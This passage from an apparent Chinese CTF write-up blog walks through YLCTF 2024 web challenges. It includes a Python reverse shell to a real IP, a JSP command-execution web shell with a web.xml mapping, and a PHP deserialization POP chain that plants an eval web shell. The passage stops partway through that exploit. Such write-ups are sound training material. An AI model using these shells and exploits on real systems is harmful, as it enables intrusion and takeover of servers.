class="hljs-variable">$key</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&gt;<span class="hljs-number">1234</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>a是匹配是否有六个字母，b是大于这个数就行函数构造绕过就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:21836/f1ag.php&#x27;</span><br>payload = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;1000000eeeeee&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;1235abc&#x27;</span><br>&#125;<br>response = requests.post(url, data=payload)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>
<h5 id="round-1-shxpl"><a class="markdownIt-Anchor" href="#round-1-shxpl"></a> [Round 1] shxpl</h5>
<p>测试一下常见的ls和cat都被禁用了，这里空格用%09进行绕过，联合查询一下</p>
<p><img src="/../../images/ylctf/2024/shxpl1.png" srcset="/img/loading.gif" lazyload alt="shxpl1"></p>
<p>然后执行cat /flag 参照上面的内容</p>
<p><img src="/../../images/ylctf/2024/shxpl2.png" srcset="/img/loading.gif" lazyload alt="shxpl2"></p>
<h5 id="round-1-injct"><a class="markdownIt-Anchor" href="#round-1-injct"></a> [Round 1] Injct</h5>
<p>简单测了一下是xss还是ssti，发现是flask的模板注入，测试一下常见的花括号被禁了，用fenjing看看内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m fenjing crack --url http://challenge.yuanloo.com:25882/greet --inputs name --method POST<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/Injct1.png" srcset="/img/loading.gif" lazyload alt="Injct1"></p>
<p>可以shell到但是试了常见的命令不能成功</p>
<p><img src="/../../images/ylctf/2024/Injct2.png" srcset="/img/loading.gif" lazyload alt="Injct2"></p>
<p>考虑到这是python写的网站，用弹个shell给我的vps,成功拿到shell得到flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&quot;8.130.42.113&quot;, 5566)); [os.dup2(s.fileno(), i) for i in (0, 1, 2)]; subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/shxpl3.png" srcset="/img/loading.gif" lazyload alt="shxpl3"></p>
<h5 id="round-1-toxec复现"><a class="markdownIt-Anchor" href="#round-1-toxec复现"></a> [Round 1] TOXEC(复现)</h5>
<p>测试了一下发现上传jsp文件会直接杀掉，又dirsearch扫了一下发现在<code>WEB-INF</code>有大量的404回显，猜测可能和羊城杯的题目相似(虽然我没写bushi),先上传一个shell.xml,是jsp的回显马</p>
<p>先上传这个，bp抓包改一下文件名</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123;  <br>    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();  <br>    int a = -1;  <br>    byte[] b = new byte[2048];  <br>    out.print(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&quot;);  <br>    while((a=in.read(b))!=-1)&#123;  <br>        out.print(new String(b));  <br>    &#125;  <br>    out.print(&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>&quot;);  <br>&#125;  <br><br>%&gt;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/TOXEC.png" srcset="/img/loading.gif" lazyload alt="TOXEC"></p>
<p>然后再上传下面这个也需要改成对应的文件格式将上面的xml解析成jsp，传入马</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jsp-file</span>&gt;</span>/WEB-INF/shell.xml<span class="hljs-tag">&lt;/<span class="hljs-name">jsp-file</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/orange<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>最后的结果如下</p>
<p><img src="/../../images/ylctf/2024/TOXEC1.png" srcset="/img/loading.gif" lazyload alt="TOXEC1"></p>
<h5 id="round-1-pexpl复现"><a class="markdownIt-Anchor" href="#round-1-pexpl复现"></a> [Round 1] pExpl(复现)</h5>
<p>先上源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileHandle</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileName</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$mode</span> = <span class="hljs-string">&#x27;r&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileName = <span class="hljs-variable">$fileName</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileHandle = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$mode</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;fileHandle) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Unable to open file: <span class="hljs-subst">$fileName</span>&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File opened: <span class="hljs-subst">$fileName</span>\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readLine</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLine</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle, <span class="hljs-variable">$data</span> . PHP_EOL);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;fileName) &amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;fileHandle)) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File closed: <span class="hljs-subst">&#123;$this-&gt;fileName&#125;</span>\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userData</span> = [];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> == <span class="hljs-string">&#x27;password&#x27;</span>) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$value</span>, PASSWORD_DEFAULT);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>] ?? <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;params) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;data) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$this</span>-&gt;data) &gt; <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;data,<span class="hljs-variable">$this</span>-&gt;params);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;userData[<span class="hljs-variable">$name</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logFile</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lastEntry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span> = <span class="hljs-string">&#x27;application.log&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>, <span class="hljs-variable">$message</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;lastEntry = <span class="hljs-string">&quot;[&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="hljs-string">&quot;] [<span class="hljs-subst">$level</span>] <span class="hljs-subst">$message</span>&quot;</span> . PHP_EOL;<br><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;logFile, <span class="hljs-variable">$this</span>-&gt;lastEntry, FILE_APPEND);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setLogFile</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearOldLogs</span>(<span class="hljs-params"><span class="hljs-variable">$daysToKeep</span> = <span class="hljs-number">30</span></span>) </span>&#123;<br>        <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;*.log&quot;</span>);<br>        <span class="hljs-variable">$now</span> = <span class="hljs-title function_ invoke__">time</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$now</span> - <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file</span>) &gt;= <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-variable">$daysToKeep</span>) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$validLevels</span> = [<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$validLevels</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid log level: <span class="hljs-subst">$name</span>&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$message</span>, <span class="hljs-variable">$level</span> = <span class="hljs-string">&#x27;INFO&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$level</span>, <span class="hljs-variable">$message</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Test!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Test!&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>根据这里可以使用php的短标签，<code>throw new Exception(&quot;Test!&quot;);</code>可以利用GC机制进行绕过,简单的来说就用构造数组进行绕过</p>
<p>再分析一下上面的pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;fileName) &amp;&amp;!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;fileHandle)) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;fileHandle);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File closed: <span class="hljs-subst">&#123;$this-&gt;fileName&#125;</span>\n&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p><code>echo</code>可以触发<code>__toString</code>魔术</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __toString() &#123;<br>        <span class="hljs-keyword">if</span>(is_string($<span class="hljs-keyword">this</span>-&gt;params) &amp;&amp; is_array($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>) &amp;&amp; count($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>) &gt; <span class="hljs-number">1</span>)&#123;<br>            call_user_func($<span class="hljs-keyword">this</span>-&gt;<span class="hljs-keyword">data</span>,$<span class="hljs-keyword">this</span>-&gt;params);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p><code>call_user_func</code> 函数用于回调构造，不能直接触发命令执行，由于有参数限制，也不能直接调用，可以尝试构造不存在的函数以此来触发<code>__call</code>魔术</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>    <br>        <span class="hljs-variable">$validLevels</span> = [<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;warning&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$validLevels</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>[<span class="hljs-number">0</span>]);<span class="hljs-comment">//调用 log 方法，传递日志级别（转换为大写）和第一个参数 $arguments[0]，这通常是要记录的消息。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid log level: <span class="hljs-subst">$name</span>&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>需要调用到 <code>array</code> 中的一个，然后在触发文件写入，构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileHandle</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fileName</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$fileName</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;fileName = <span class="hljs-variable">$fileName</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userData</span> = [];<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logFile</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lastEntry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logFile</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logFile = <span class="hljs-variable">$logFile</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 创建 Logger 对象</span><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-string">&quot;/var/www/html/1.php&quot;</span>);<br><span class="hljs-comment">// 创建 User 对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-comment">// 为 User 对象的属性赋值</span><br><span class="hljs-variable">$b</span>-&gt;data = [<span class="hljs-variable">$c</span>, <span class="hljs-string">&quot;info&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;params = <span class="hljs-string">&#x27;&lt;?=@eval($_POST[1]);?&gt;&#x27;</span>;  <br><span class="hljs-comment">// 创建 FileHandler 对象，传入 User 对象</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">// 序列化并替换特定字符串</span><br><span class="hljs-variable">$a1</span> = <span class="hljs-keyword">array</span>(<span 